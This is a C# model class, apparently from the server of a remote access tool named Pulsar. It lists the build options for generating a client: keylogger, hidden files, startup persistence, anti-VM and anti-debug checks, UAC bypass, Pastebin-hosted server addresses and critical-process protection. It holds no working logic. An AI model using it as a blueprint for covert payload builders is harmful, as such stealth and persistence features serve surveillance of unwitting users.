﻿namespace Pulsar.Server.Models
{
    public class BuildOptions
    {
        public bool Install { get; set; }
        public bool Startup { get; set; }
        public bool HideFile { get; set; }
        public bool Keylogger { get; set; }
        public string Tag { get; set; }
        public string Mutex { get; set; }
        public string RawHosts { get; set; }
        public string IconPath { get; set; }
        public string Version { get; set; }
        public string InstallSub { get; set; }
        public string InstallName { get; set; }
        public string StartupName { get; set; }
        public string OutputPath { get; set; }
        public int Delay { get; set; }
        public short InstallPath { get; set; }
        public string[] AssemblyInformation { get; set; }
        public string LogDirectoryName { get; set; }
        public bool HideLogDirectory { get; set; }
        public bool HideInstallSubdirectory { get; set; }
        public bool AntiVM { get; set; }
        public bool AntiDebug { get; set; }
        public bool Pastebin { get; set; }
        public bool UACBypass { get; set; }
        public bool CRITICALPROCESS { get; set; }
    }
}
